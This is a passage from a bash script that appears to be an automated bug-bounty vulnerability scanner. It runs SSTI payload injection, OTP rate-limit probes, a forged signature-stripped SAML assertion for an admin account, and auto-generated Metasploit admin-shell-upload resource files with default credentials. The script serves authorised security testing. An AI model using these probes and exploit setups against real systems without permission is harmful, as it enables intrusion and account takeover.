        DALFOX_COUNT=$(count_findings "$FINDINGS_DIR/xss/dalfox_results.txt")
        [ "$DALFOX_COUNT" -gt 0 ] && log_vuln "Dalfox found $DALFOX_COUNT potential XSS" || log_done "Dalfox: no XSS found"
    fi

    # Nuclei XSS templates
    if command -v nuclei &>/dev/null; then
        log_step "Running nuclei XSS templates..."
        cat "$LIVE_URLS" | nuclei \
            -tags xss \
            -severity low,medium,high,critical \
            -silent \
            -rate-limit "$RATE_LIMIT" \
            -concurrency "$THREADS" \
            "${BB_AUTH_ARGS[@]}" \
            -output "$FINDINGS_DIR/xss/nuclei_xss.txt" 2>/dev/null || true

        NUCLEI_XSS=$(count_findings "$FINDINGS_DIR/xss/nuclei_xss.txt")
        [ "$NUCLEI_XSS" -gt 0 ] && log_vuln "Nuclei found $NUCLEI_XSS XSS issues" || log_done "Nuclei XSS: clean"
    fi
fi

# ============================================================
# Check 1.5: SSTI (Server-Side Template Injection)
# ============================================================
echo ""
if ! skip_has ssti; then
    log_info "Check 1.5: SSTI Detection"
    SSTI_OUT="$FINDINGS_DIR/ssti/ssti_candidates.txt"

    if [ -s "$PARAM_URLS" ]; then
        SSTI_LIMIT=$(scan_limit 20 50 100)
        SSTI_ENGINES=("jinja2" "freemarker" "thymeleaf" "erb")
        SSTI_PAYLOADS=("{{7*7}}" "\${7*7}" "*{7*7}" "<%= 7*7 %>")
        SSTI_HITS=0

        log_step "Testing SSTI payloads on up to $SSTI_LIMIT URLs..."

        while IFS= read -r url; do
            [ -z "$url" ] && continue

            for idx in "${!SSTI_ENGINES[@]}"; do
                ENGINE="${SSTI_ENGINES[$idx]}"
                PAYLOAD="${SSTI_PAYLOADS[$idx]}"
                INJECTED_URL=$(replace_all_param_values "$url" "$PAYLOAD")
                BODY=$(curl -sk "${BB_AUTH_ARGS[@]}" --max-time 10 "$INJECTED_URL" 2>/dev/null || true)

                if printf '%s\n' "$BODY" | grep -qE '(\b49\b|7777777)'; then
                    log_crit "SSTI confirmed [$ENGINE]: $INJECTED_URL"
                    echo "[SSTI-CONFIRMED] engine=$ENGINE url=$INJECTED_URL" >> "$SSTI_OUT"
                    SSTI_HITS=$((SSTI_HITS + 1))
                    break
                fi
            done
        done < <(head -"$SSTI_LIMIT" "$PARAM_URLS")

        [ "$SSTI_HITS" -eq 0 ] && log_done "SSTI: clean"
    else
        log_done "SSTI: no parameterized URLs"
    fi
else
    log_warn "Skipping SSTI checks (--skip)"
fi

# ============================================================
# Check 2: Subdomain Takeover
# ============================================================
echo ""
if ! skip_has takeover; then
log_info "Check 2: Subdomain Takeover"

SUBDOMAINS="$RECON_DIR/subdomains/all.txt"

# Subjack
if command -v subjack &>/dev/null && [ -s "$SUBDOMAINS" ]; then
    log_step "Running subjack..."
    subjack -w "$SUBDOMAINS" \
        -t "$THREADS" \
        -timeout 30 \
        -ssl \
        -o "$FINDINGS_DIR/takeover/subjack_results.txt" 2>/dev/null || true

    SUBJACK_COUNT=$(count_findings "$FINDINGS_DIR/takeover/subjack_results.txt")
    [ "$SUBJACK_COUNT" -gt 0 ] && log_vuln "Subjack found $SUBJACK_COUNT potential takeovers" || log_done "Subjack: no takeovers"
fi

# Nuclei takeover templates
if command -v nuclei &>/dev/null && [ -s "$LIVE_URLS" ]; then
    log_step "Running nuclei takeover templates..."
    cat "$LIVE_URLS" | nuclei \
        -tags takeover \
        -silent \
        -rate-limit "$RATE_LIMIT" \
        "${BB_AUTH_ARGS[@]}" \
        -output "$FINDINGS_DIR/takeover/nuclei_takeover.txt" 2>/dev/null || true

    NUCLEI_TK=$(count_findings "$FINDINGS_DIR/takeover/nuclei_takeover.txt")
    [ "$NUCLEI_TK" -gt 0 ] && log_vuln "Nuclei found $NUCLEI_TK takeover issues" || log_done "Nuclei takeover: clean"
fi
else
    log_warn "Skipping takeover checks (--skip)"
fi

# ============================================================
# Check 3: Misconfigurations
# ============================================================
echo ""
if ! skip_has misconfig; then
log_info "Check 3: Misconfigurations"

if command -v nuclei &>/dev/null && [ -s "$LIVE_URLS" ]; then
    # CORS misconfigurations
    log_step "Checking CORS misconfigurations..."
    cat "$LIVE_URLS" | nuclei \
        -tags cors \
        -silent \
        -rate-limit "$RATE_LIMIT" \
        "${BB_AUTH_ARGS[@]}" \
        -output "$FINDINGS_DIR/misconfig/cors.txt" 2>/dev/null || true
    CORS_COUNT=$(count_findings "$FINDINGS_DIR/misconfig/cors.txt")
    [ "$CORS_COUNT" -gt 0 ] && log_vuln "CORS misconfigs: $CORS_COUNT" || log_done "CORS: clean"

    # Security headers
    log_step "Checking security headers..."
    cat "$LIVE_URLS" | nuclei \
        -tags headers,missing-headers \
        -severity medium,high,critical \
        -silent \
        -rate-limit "$RATE_LIMIT" \
        "${BB_AUTH_ARGS[@]}" \
        -output "$FINDINGS_DIR/misconfig/headers.txt" 2>/dev/null || true
    HDR_COUNT=$(count_findings "$FINDINGS_DIR/misconfig/headers.txt")
    [ "$HDR_COUNT" -gt 0 ] && log_vuln "Header issues: $HDR_COUNT" || log_done "Headers: clean"

    # General misconfigurations
    log_step "Running misconfiguration templates..."
    cat "$LIVE_URLS" | nuclei \
        -tags misconfig \
        -severity medium,high,critical \
        -silent \
        -rate-limit "$RATE_LIMIT" \
        "${BB_AUTH_ARGS[@]}" \
        -output "$FINDINGS_DIR/misconfig/general.txt" 2>/dev/null || true
    MISC_COUNT=$(count_findings "$FINDINGS_DIR/misconfig/general.txt")
    [ "$MISC_COUNT" -gt 0 ] && log_vuln "Misconfigs: $MISC_COUNT" || log_done "General misconfig: clean"
fi

run_iis_shortname_checks
else
    log_warn "Skipping misconfiguration checks (--skip)"
fi

# ============================================================
# Check 4: Sensitive Data Exposure
# ============================================================
echo ""
if ! skip_has exposure; then
log_info "Check 4: Sensitive Data Exposure"

if command -v nuclei &>/dev/null && [ -s "$LIVE_URLS" ]; then
    # Exposed files (.git, .env, backups, etc.)
    log_step "Checking for exposed files (.git, .env, backups)..."
    cat "$LIVE_URLS" | nuclei \
        -tags exposure,file \
        -severity low,medium,high,critical \
        -silent \
        -rate-limit "$RATE_LIMIT" \
        "${BB_AUTH_ARGS[@]}" \
        -output "$FINDINGS_DIR/exposure/exposed_files.txt" 2>/dev/null || true
    EXP_COUNT=$(count_findings "$FINDINGS_DIR/exposure/exposed_files.txt")
    [ "$EXP_COUNT" -gt 0 ] && log_vuln "Exposed files: $EXP_COUNT" || log_done "Exposed files: clean"

    # Exposed panels (admin, debug, etc.)
    log_step "Checking for exposed panels..."
    cat "$LIVE_URLS" | nuclei \
        -tags panel,login \
        -severity medium,high,critical \
        -silent \
        -rate-limit "$RATE_LIMIT" \
        "${BB_AUTH_ARGS[@]}" \
        -output "$FINDINGS_DIR/exposure/panels.txt" 2>/dev/null || true
    PANEL_COUNT=$(count_findings "$FINDINGS_DIR/exposure/panels.txt")
    [ "$PANEL_COUNT" -gt 0 ] && log_vuln "Exposed panels: $PANEL_COUNT" || log_done "Panels: clean"

    # Technology detection & default credentials
    log_step "Checking for default credentials..."
    cat "$LIVE_URLS" | nuclei \
        -tags default-login \
        -severity high,critical \
        -silent \
        -rate-limit "$RATE_LIMIT" \
        "${BB_AUTH_ARGS[@]}" \
        -output "$FINDINGS_DIR/exposure/default_creds.txt" 2>/dev/null || true
    CRED_COUNT=$(count_findings "$FINDINGS_DIR/exposure/default_creds.txt")
    [ "$CRED_COUNT" -gt 0 ] && log_vuln "Default creds: $CRED_COUNT" || log_done "Default creds: clean"
fi

# Manual check: sensitive paths from recon
if [ -s "$RECON_DIR/urls/sensitive_paths.txt" ]; then
    log_step "Verifying sensitive paths from recon..."
    while IFS= read -r url; do
        STATUS=$(curl -s "${BB_AUTH_ARGS[@]}" -o /dev/null -w "%{http_code}" --max-time 5 "$url" 2>/dev/null || echo "000")
        if [ "$STATUS" = "200" ]; then
            echo "$STATUS $url" >> "$FINDINGS_DIR/exposure/verified_sensitive.txt"
        fi
    done < <(head -50 "$RECON_DIR/urls/sensitive_paths.txt")

    VERIFIED=$(count_findings "$FINDINGS_DIR/exposure/verified_sensitive.txt")
    [ "$VERIFIED" -gt 0 ] && log_vuln "Verified sensitive paths: $VERIFIED" || log_done "Sensitive paths: clean"
fi
else
    log_warn "Skipping exposure checks (--skip)"
fi

# ============================================================
# Check 5: SSRF (Server-Side Request Forgery)
# ============================================================
echo ""
if ! skip_has ssrf; then
log_info "Check 5: SSRF Detection"

if command -v nuclei &>/dev/null && [ -s "$LIVE_URLS" ]; then
    log_step "Running nuclei SSRF templates..."
    cat "$LIVE_URLS" | nuclei \
        -tags ssrf \
        -severity medium,high,critical \
        -silent \
        -rate-limit "$RATE_LIMIT" \
        "${BB_AUTH_ARGS[@]}" \
        -output "$FINDINGS_DIR/ssrf/nuclei_ssrf.txt" 2>/dev/null || true
    SSRF_COUNT=$(count_findings "$FINDINGS_DIR/ssrf/nuclei_ssrf.txt")
    [ "$SSRF_COUNT" -gt 0 ] && log_vuln "SSRF issues: $SSRF_COUNT" || log_done "SSRF: clean"
fi

# Flag URL parameters for manual SSRF testing
if [ -s "$RECON_DIR/params/interesting_params.txt" ]; then
    grep -iE '(url|redirect|dest|uri|path|file|doc|load|link|src|source|target|callback|domain|site|feed|rurl|return|next)' \
        "$RECON_DIR/params/interesting_params.txt" > "$FINDINGS_DIR/ssrf/ssrf_params_manual.txt" 2>/dev/null || true
    MANUAL_SSRF=$(count_findings "$FINDINGS_DIR/ssrf/ssrf_params_manual.txt")
    [ "$MANUAL_SSRF" -gt 0 ] && log_warn "Params for manual SSRF testing: $MANUAL_SSRF"
fi
else
    log_warn "Skipping SSRF checks (--skip)"
fi

# ============================================================
# Check 6: CVE Detection
# ============================================================
echo ""
if ! skip_has cves; then
log_info "Check 6: Known CVEs"

if command -v nuclei &>/dev/null && [ -s "$LIVE_URLS" ]; then
    # Cap total CVE scan time: quick=180s, standard/full=600s. Without this,
    # nuclei -tags cve against a target with hundreds of URLs can run for
    # >90 min, causing hunt.py orchestration to time out. Honor BB_CVE_TIMEOUT
    # env var for operators who need a different budget.
    if [ "$SCAN_MODE" = "quick" ]; then
        CVE_TIMEOUT="${BB_CVE_TIMEOUT:-180}"
    else
        CVE_TIMEOUT="${BB_CVE_TIMEOUT:-600}"
    fi
    log_step "Running nuclei CVE templates (max ${CVE_TIMEOUT}s)..."
    timeout --preserve-status "$CVE_TIMEOUT" nuclei \
        -l "$LIVE_URLS" \
        -tags cve \
        -severity medium,high,critical \
        -silent \
        -rate-limit "$RATE_LIMIT" \
        -concurrency "$THREADS" \
        "${BB_AUTH_ARGS[@]}" \
        -output "$FINDINGS_DIR/cves/nuclei_cves.txt" 2>/dev/null || true
    CVE_COUNT=$(count_findings "$FINDINGS_DIR/cves/nuclei_cves.txt")
    [ "$CVE_COUNT" -gt 0 ] && log_vuln "CVEs found: $CVE_COUNT" || log_done "CVEs: clean"
fi
else
    log_warn "Skipping CVE checks (--skip)"
fi

# ============================================================
# Check 7: Open Redirects
# ============================================================
echo ""
if ! skip_has redirects; then
log_info "Check 7: Open Redirects"

if command -v nuclei &>/dev/null && [ -s "$LIVE_URLS" ]; then
    log_step "Running nuclei redirect templates..."
    cat "$LIVE_URLS" | nuclei \
        -tags redirect \
        -severity low,medium,high \
        -silent \
        -rate-limit "$RATE_LIMIT" \
        "${BB_AUTH_ARGS[@]}" \
        -output "$FINDINGS_DIR/redirects/nuclei_redirects.txt" 2>/dev/null || true
    REDIR_COUNT=$(count_findings "$FINDINGS_DIR/redirects/nuclei_redirects.txt")
    [ "$REDIR_COUNT" -gt 0 ] && log_vuln "Open redirects: $REDIR_COUNT" || log_done "Redirects: clean"
fi

# Flag redirect parameters for manual testing
if [ -s "$RECON_DIR/params/interesting_params.txt" ]; then
    grep -iE '(redirect|return|next|url|callback|goto|continue|dest|rurl|return_to|out)' \
        "$RECON_DIR/params/interesting_params.txt" > "$FINDINGS_DIR/redirects/redirect_params_manual.txt" 2>/dev/null || true
    MANUAL_REDIR=$(count_findings "$FINDINGS_DIR/redirects/redirect_params_manual.txt")
    [ "$MANUAL_REDIR" -gt 0 ] && log_warn "Params for manual redirect testing: $MANUAL_REDIR"
fi
else
    log_warn "Skipping redirect checks (--skip)"
fi

# ============================================================
# Check 8: IDOR / Auth Bypass / Business Logic
# ============================================================
echo ""
log_info "Check 8: IDOR / Auth Bypass / Business Logic"

mkdir -p "$FINDINGS_DIR/idor"
mkdir -p "$FINDINGS_DIR/auth_bypass"

# 8a: Check for IDOR-prone parameters in collected URLs
if ! skip_has idor && [ -s "$PARAM_URLS" ]; then
    log_step "Flagging IDOR-prone parameters..."
    grep -iE '[?&](id|user_id|uid|account|profile|order|order_id|invoice|doc|file_id|report|ticket|msg|message_id|comment_id|item|product_id|cart|session|ref|record)=' \
        "$PARAM_URLS" > "$FINDINGS_DIR/idor/idor_candidates.txt" 2>/dev/null || true
    IDOR_COUNT=$(count_findings "$FINDINGS_DIR/idor/idor_candidates.txt")
    [ "$IDOR_COUNT" -gt 0 ] && log_warn "IDOR candidate URLs: $IDOR_COUNT (manual testing required)" || log_done "IDOR params: none found"
fi

# 8b: Check for numeric/sequential IDs in API endpoints
if ! skip_has idor && [ -s "$RECON_DIR/urls/api_endpoints.txt" ]; then
    log_step "Checking API endpoints for sequential IDs..."
    grep -E '/[0-9]{1,8}(/|$|\?)' "$RECON_DIR/urls/api_endpoints.txt" \
        > "$FINDINGS_DIR/idor/api_sequential_ids.txt" 2>/dev/null || true
    SEQ_COUNT=$(count_findings "$FINDINGS_DIR/idor/api_sequential_ids.txt")
    [ "$SEQ_COUNT" -gt 0 ] && log_warn "API endpoints with sequential IDs: $SEQ_COUNT" || log_done "Sequential IDs: none"
fi

# 8c: Auth bypass checks — test unauthenticated access to API endpoints
if ! skip_has auth_bypass && [ -s "$RECON_DIR/urls/api_endpoints.txt" ]; then
    log_step "Testing API endpoints for unauthenticated access..."
    while IFS= read -r api_url; do
        STATUS=$(curl -s "${BB_AUTH_ARGS[@]}" -o /dev/null -w "%{http_code}" --max-time 5 "$api_url" 2>/dev/null || echo "000")
        BODY_SIZE=$(curl -s "${BB_AUTH_ARGS[@]}" --max-time 5 "$api_url" 2>/dev/null | wc -c | tr -d ' ')
        # Flag endpoints returning 200 with substantial body (not just error pages)
        if [ "$STATUS" = "200" ] && [ "$BODY_SIZE" -gt 500 ]; then
            echo "$STATUS $BODY_SIZE $api_url" >> "$FINDINGS_DIR/auth_bypass/unauth_api_access.txt"
        fi
    done < <(head -30 "$RECON_DIR/urls/api_endpoints.txt")
    UNAUTH_COUNT=$(count_findings "$FINDINGS_DIR/auth_bypass/unauth_api_access.txt")
    [ "$UNAUTH_COUNT" -gt 0 ] && log_vuln "Unauthenticated API access: $UNAUTH_COUNT" || log_done "Auth bypass: clean"
fi

# 8d: Exposed config files (env.js, app_env.js)
if [ -s "$RECON_DIR/exposure/config_files.txt" ] 2>/dev/null; then
    cp "$RECON_DIR/exposure/config_files.txt" "$FINDINGS_DIR/exposure/config_files.txt" 2>/dev/null || true
    CFG_COUNT=$(count_findings "$FINDINGS_DIR/exposure/config_files.txt")
    [ "$CFG_COUNT" -gt 0 ] && log_vuln "Exposed config files from recon: $CFG_COUNT"
fi

# 8e: HTTP method tampering (PUT/DELETE on endpoints that should only accept GET/POST)
if ! skip_has auth_bypass && [ -s "$LIVE_URLS" ]; then
    FIRST_LIVE_URL=$(head -1 "$LIVE_URLS" 2>/dev/null || true)
    if [ -n "$FIRST_LIVE_URL" ] && unsafe_method_guard "PUT" "$FIRST_LIVE_URL" "HTTP method tampering probes"; then
        log_step "Testing HTTP method tampering on sample endpoints..."
        while IFS= read -r url; do
            for METHOD in PUT DELETE PATCH; do
                STATUS=$(curl -s "${BB_AUTH_ARGS[@]}" -o /dev/null -w "%{http_code}" -X "$METHOD" --max-time 5 "$url" 2>/dev/null || echo "000")
                if [ "$STATUS" = "200" ] || [ "$STATUS" = "201" ] || [ "$STATUS" = "204" ]; then
                    echo "$METHOD $STATUS $url" >> "$FINDINGS_DIR/auth_bypass/method_tampering.txt"
                fi
            done
        done < <(head -10 "$LIVE_URLS")
        # Suppress SPA-fallback false positives (Angular/React/Vue index.html catchall)
        if [ -s "$FINDINGS_DIR/auth_bypass/method_tampering.txt" ] && [ -s "$SPA_FP" ]; then
            (cd "$BASE_DIR" 2>/dev/null && python3 -m tools.noise_filter filter \
                --findings "$FINDINGS_DIR/auth_bypass/method_tampering.txt" \
                --fingerprints "$SPA_FP" \
                --drop "$FINDINGS_DIR/.tmp/method_tampering.suppressed.txt" 2>/dev/null) || true
        fi
        METHOD_COUNT=$(count_findings "$FINDINGS_DIR/auth_bypass/method_tampering.txt")
        [ "$METHOD_COUNT" -gt 0 ] && log_warn "Method tampering findings: $METHOD_COUNT (manual verification needed)" || log_done "Method tampering: clean"
    fi
fi

if skip_has idor; then
    log_warn "Skipping IDOR candidate checks (--skip)"
fi

if skip_has auth_bypass; then
    log_warn "Skipping auth-bypass checks (--skip)"
fi

# 8f: Auth flow review candidates — low-noise passive keyword matching only
if ! skip_has auth_flow; then
    log_step "Flagging auth-flow review candidates (MFA / SAML / SSO)..."
    AUTH_FLOW_REVIEW="$FINDINGS_DIR/manual_review/auth_flow_review.txt"
    : > "$AUTH_FLOW_REVIEW"

    for candidate_file in \
        "$PARAM_URLS" \
        "$ALL_URLS" \
        "$RECON_DIR/urls/api_endpoints.txt" \
        "$RECON_DIR/params/interesting_params.txt"
    do
        [ -s "$candidate_file" ] || continue
        grep -iE 'mfa|2fa|otp|totp|saml|sso|relaystate|samlrequest|samlresponse' \
            "$candidate_file" >> "$AUTH_FLOW_REVIEW" 2>/dev/null || true
    done

    if [ -s "$AUTH_FLOW_REVIEW" ]; then
        sort -u "$AUTH_FLOW_REVIEW" -o "$AUTH_FLOW_REVIEW"
        AUTH_FLOW_COUNT=$(count_findings "$AUTH_FLOW_REVIEW")
        log_warn "Auth-flow review candidates: $AUTH_FLOW_COUNT (manual MFA/SAML review recommended)"
    else
        rm -f "$AUTH_FLOW_REVIEW"
        log_done "Auth-flow review candidates: none found"
    fi
else
    log_warn "Skipping auth-flow review checks (--skip)"
fi

# ============================================================
# Check 9: CMS Detection & Metasploit RC Generation
# ============================================================
echo ""
if ! skip_has cms; then
    log_info "Check 9: CMS Detection & MSF RC Generation"
    CMS_LIMIT=$(scan_limit 20 50 100)

    while IFS= read -r url; do
        [ -z "$url" ] && continue
        RESPONSE=$(curl -sk "${BB_AUTH_ARGS[@]}" --max-time 10 "$url" 2>/dev/null || true)
        CMS=""

        if printf '%s\n' "$RESPONSE" | grep -qi "wp-content\|wordpress"; then
            CMS="wordpress"
        elif printf '%s\n' "$RESPONSE" | grep -qi "drupal"; then
            CMS="drupal"
        fi

        [ -n "$CMS" ] || continue

        log_vuln "$CMS detected: $url"
        SAFE_NAME=$(printf '%s\n' "$url" | tr '[:upper:]' '[:lower:]' | sed 's|[^a-z0-9]|_|g')
        MSF_RC="$FINDINGS_DIR/metasploit/${CMS}_${SAFE_NAME}.rc"
        HOST_PART=$(printf '%s\n' "$url" | cut -d'/' -f3 | cut -d':' -f1)
        RHOST_VAL="$HOST_PART"

        if command -v dig >/dev/null 2>&1; then
            DIG_IP=$(dig +short "$HOST_PART" 2>/dev/null | head -1 || true)
            [ -n "$DIG_IP" ] && RHOST_VAL="$DIG_IP"
        fi

        {
            echo "use exploit/unix/webapp/${CMS}_admin_shell_upload"
            echo "set RHOSTS $RHOST_VAL"
            echo "set SSL $([[ "$url" == https* ]] && echo "true" || echo "false")"
            echo "set TARGETURI /"
            echo "set USERNAME admin"
            echo "set PASSWORD admin"
        } > "$MSF_RC"

        log_ok "Metasploit RC generated: $MSF_RC"
    done < <(head -"$CMS_LIMIT" "$ORDERED_SCAN")
else
    log_warn "Skipping CMS checks (--skip)"
fi

# ============================================================
# Check 10: MFA / 2FA Bypass
# ============================================================
echo ""
if ! skip_has mfa; then
    log_info "Check 10: MFA / 2FA Bypass"
    MFA_LIMIT=$(scan_limit 10 20 40)
    MFA_ENDPOINTS=$(grep -iE "/(mfa|otp|2fa|verify|authenticate|token|totp|sms.code|auth.code)" "$ORDERED_SCAN" 2>/dev/null | head -"$MFA_LIMIT" || true)

    if [ -n "$MFA_ENDPOINTS" ]; then
        while IFS= read -r url; do
            [ -z "$url" ] && continue
            BASE=$(printf '%s\n' "$url" | cut -d'?' -f1)
            HOST=$(printf '%s\n' "$url" | grep -oE "https?://[^/]+" || true)

            if unsafe_method_guard "POST" "$BASE" "MFA rate-limit probe"; then
                log_step "Rate limit probe: $BASE"
                STATUS_RAW=$(for _i in $(seq 1 15); do
                    curl -sk -o /dev/null -w "%{http_code}\n" --max-time 5 \
                        "${BB_AUTH_ARGS[@]}" \
                        -X POST "$BASE" \
                        -H "Content-Type: application/json" \
                        -d '{"otp":"000000"}' 2>/dev/null || echo "ERR"
                done)
                STATUS_CODES=$(printf '%s\n' "$STATUS_RAW" | sort | uniq -c | sort -rn | head -5)

                if printf '%s\n' "$STATUS_RAW" | grep -Eq '^[2-5][0-9][0-9]$' \
                    && ! printf '%s\n' "$STATUS_RAW" | grep -q '^429$'; then
                    log_vuln "[MFA] No rate limit detected on OTP endpoint: $BASE"
                    echo "[MFA-NO-RATE-LIMIT] $BASE | codes: $STATUS_CODES" >> "$FINDINGS_DIR/mfa/findings.txt"
                fi
            fi

            if [ -n "$HOST" ]; then
                log_step "Workflow skip probe: $BASE"
                for PROTECTED in dashboard home profile account settings admin; do
                    SKIP_CODE=$(curl -sk "${BB_AUTH_ARGS[@]}" -o /dev/null -w "%{http_code}" --max-time 5 "$HOST/$PROTECTED" 2>/dev/null || echo "000")
                    if [ "$SKIP_CODE" = "200" ]; then
                        log_vuln "[MFA] Protected endpoint accessible before MFA: $HOST/$PROTECTED"
                        echo "[MFA-WORKFLOW-SKIP] $HOST/$PROTECTED accessible (HTTP 200)" >> "$FINDINGS_DIR/mfa/findings.txt"
                    fi
                done
            fi

            if unsafe_method_guard "POST" "$BASE" "MFA response-manipulation canary"; then
                MFA_RESP=$(curl -sk "${BB_AUTH_ARGS[@]}" --max-time 5 -X POST "$BASE" \
                    -H "Content-Type: application/json" \
                    -d '{"otp":"999999"}' 2>/dev/null || true)

                if printf '%s\n' "$MFA_RESP" | grep -qi '"success"[[:space:]]*:[[:space:]]*false\|"verified"[[:space:]]*:[[:space:]]*false\|"status"[[:space:]]*:[[:space:]]*"fail"'; then
                    log_vuln "[MFA] Response manipulation candidate: $BASE"
                    echo "[MFA-RESPONSE-MANIP] $BASE | change false->true in response" >> "$FINDINGS_DIR/mfa/findings.txt"
                fi
            fi
        done <<< "$MFA_ENDPOINTS"
    else
        log_warn "No MFA/OTP endpoints detected in URL list"
    fi
else
    log_warn "Skipping MFA checks (--skip)"
fi

# ============================================================
# Check 11: SAML / SSO Attacks
# ============================================================
echo ""
if ! skip_has saml; then
    log_info "Check 11: SAML / SSO Attack Surface"
    SAML_HOST_LIMIT=$(scan_limit 10 20 50)

    while IFS= read -r host; do
        [ -z "$host" ] && continue
        for SAML_PATH in "/saml/login" "/sso/saml" "/auth/saml" "/api/auth/saml" \
                         "/login/saml" "/saml/acs" "/saml/metadata" "/adfs/ls" \
                         "/.well-known/openid-configuration"; do
            SAML_URL="${host%/}${SAML_PATH}"
            SAML_CODE=$(curl -sk "${BB_AUTH_ARGS[@]}" -o /dev/null -w "%{http_code}" --max-time 5 "$SAML_URL" 2>/dev/null || echo "000")

            case "$SAML_CODE" in
                200|301|302|403)
                    log_vuln "[SAML] Endpoint found (HTTP $SAML_CODE): $SAML_URL"
                    echo "[SAML-ENDPOINT] $SAML_URL | HTTP $SAML_CODE" >> "$FINDINGS_DIR/saml/endpoints.txt"
                    ;;
            esac
        done
    done < <(head -"$SAML_HOST_LIMIT" "$LIVE_URLS")

    # Suppress SPA-fallback false positives before metadata + sig-stripping probes
    if [ -s "$FINDINGS_DIR/saml/endpoints.txt" ] && [ -s "$SPA_FP" ]; then
        (cd "$BASE_DIR" 2>/dev/null && python3 -m tools.noise_filter filter \
            --findings "$FINDINGS_DIR/saml/endpoints.txt" \
            --fingerprints "$SPA_FP" \
            --drop "$FINDINGS_DIR/.tmp/saml_endpoints.suppressed.txt" 2>/dev/null) || true
    fi

    while IFS= read -r saml_url; do
        [ -z "$saml_url" ] && continue
        SAML_RESP=$(curl -sk "${BB_AUTH_ARGS[@]}" --max-time 8 "$saml_url" 2>/dev/null || true)

        if printf '%s\n' "$SAML_RESP" | grep -qi "EntityDescriptor\|IDPSSODescriptor\|X509Certificate"; then
            log_vuln "[SAML] Metadata exposed: $saml_url"
            echo "[SAML-METADATA-EXPOSED] $saml_url" >> "$FINDINGS_DIR/saml/findings.txt"
            printf '%s\n' "$SAML_RESP" | grep -o '<X509Certificate>[^<]*' | head -3 >> "$FINDINGS_DIR/saml/certs.txt" 2>/dev/null || true
        fi
    done < <(awk '{print $2}' "$FINDINGS_DIR/saml/endpoints.txt" 2>/dev/null || true)

    ACS_URL=$(grep -E "saml/acs|saml/login" "$FINDINGS_DIR/saml/endpoints.txt" 2>/dev/null | head -1 | awk '{print $2}' || true)
    if [ -n "$ACS_URL" ] && unsafe_method_guard "POST" "$ACS_URL" "SAML signature-stripping probe"; then
        STRIPPED_SAML=$(printf '%s' '<?xml version="1.0"?><samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"><saml:Assertion><saml:Subject><saml:NameID>admin@target.com</saml:NameID></saml:Subject></saml:Assertion></samlp:Response>' | base64 | tr -d '\n')
        SAML_POST_CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 8 \
            "${BB_AUTH_ARGS[@]}" \
            -X POST "$ACS_URL" \
            -d "SAMLResponse=${STRIPPED_SAML}" 2>/dev/null || echo "000")

        if [ "$SAML_POST_CODE" = "200" ] || [ "$SAML_POST_CODE" = "302" ]; then
            log_vuln "[SAML] Signature stripping accepted (HTTP $SAML_POST_CODE): $ACS_URL"
            echo "[SAML-SIG-STRIP] $ACS_URL | HTTP $SAML_POST_CODE | stripped assertion accepted" >> "$FINDINGS_DIR/saml/findings.txt"
        fi
    fi

    # Suppress SPA-fallback false positives in sig-stripping / metadata findings
    if [ -s "$FINDINGS_DIR/saml/findings.txt" ] && [ -s "$SPA_FP" ]; then
        (cd "$BASE_DIR" 2>/dev/null && python3 -m tools.noise_filter filter \
            --findings "$FINDINGS_DIR/saml/findings.txt" \
            --fingerprints "$SPA_FP" \
            --drop "$FINDINGS_DIR/.tmp/saml_findings.suppressed.txt" 2>/dev/null) || true
    fi

    SAML_FINDINGS=$(count_findings "$FINDINGS_DIR/saml/findings.txt")
    [ "$SAML_FINDINGS" -gt 0 ] && log_ok "[SAML] $SAML_FINDINGS finding(s) — review $FINDINGS_DIR/saml/"
else
    log_warn "Skipping SAML checks (--skip)"
fi

# ============================================================
# Consolidate Findings
# ============================================================
echo ""
log_info "Consolidating findings..."

# Merge all findings into summary
TOTAL_FINDINGS=0
FINDING_SUMMARY="$FINDINGS_DIR/summary.txt"
FINDING_SUMMARY_JSON="$FINDINGS_DIR/summary.json"
FINDING_INDEX_JSON="$FINDINGS_DIR/findings.json"

{
    echo "============================================="
    echo "  Vulnerability Scan Summary — $TARGET"
    echo "  Scan Date: $(date)"
    echo "  Recon Data: $RECON_DIR"
    echo "============================================="
    echo ""

    for category in upload sqli xss ssti takeover misconfig exposure ssrf cves redirects idor auth_bypass mfa saml metasploit; do
        CAT_TOTAL=0
        echo "--- $category ---"
        for file in "$FINDINGS_DIR/$category/"*.txt; do
            if [ -f "$file" ] && [ -s "$file" ]; then
                COUNT=$(wc -l < "$file" | tr -d ' ')
                CAT_TOTAL=$((CAT_TOTAL + COUNT))
                echo "  $(basename "$file"): $COUNT findings"
            fi
        done
        echo "  Category total: $CAT_TOTAL"
        TOTAL_FINDINGS=$((TOTAL_FINDINGS + CAT_TOTAL))
        echo ""
    done

    echo "============================================="
    echo "  TOTAL FINDINGS: $TOTAL_FINDINGS"
    echo "============================================="
    echo "  Verified SQLi PoCs: $(awk '/SQLI-POC-VERIFIED/ { count++ } END { print count + 0 }' "$FINDINGS_DIR/sqli/timebased_candidates.txt" 2>/dev/null || echo 0)"
    echo "  Verified RCE PoCs: $(count_vuln "$FINDINGS_DIR/upload/verified_rce_pocs.txt")"
    echo "  SSTI Confirmed: $(count_vuln "$FINDINGS_DIR/ssti/ssti_candidates.txt")"
    echo "  MFA Findings: $(count_vuln "$FINDINGS_DIR/mfa/findings.txt")"
    echo "  SAML Findings: $(count_vuln "$FINDINGS_DIR/saml/findings.txt")"
    echo ""
    echo "  Items requiring manual review:"
    for file in "$FINDINGS_DIR"/*/manual*.txt "$FINDINGS_DIR/manual_review/"*.txt; do
        [ -f "$file" ] && [ -s "$file" ] && echo "    - $file ($(wc -l < "$file" | tr -d ' ') items)"
    done
} > "$FINDING_SUMMARY"

if write_summary_json "$FINDING_SUMMARY_JSON"; then
    log_done "Structured summary: $FINDING_SUMMARY_JSON"
else
    log_warn "Unable to write structured summary JSON"
fi

if python3 "$BASE_DIR/tools/finding_index.py" "$FINDINGS_DIR" --target "$TARGET" --output "$FINDING_INDEX_JSON" >/dev/null; then
    log_done "Structured findings: $FINDING_INDEX_JSON"
else
    log_warn "Unable to write structured findings index"
fi

# scanner_pass.json — records which (endpoint, vuln_class) pairs this run
# exercised, so tools/coverage_matrix.py rebuild can mark already-tested cells
# `tested_clean` (per task 05-16-b4-scanner-matrix-feedback). Additive only;
# failures here MUST NOT change scanner exit semantics (R4 / NG3).
if python3 "$BASE_DIR/tools/scanner_pass_writer.py" \
        --target "$TARGET" \
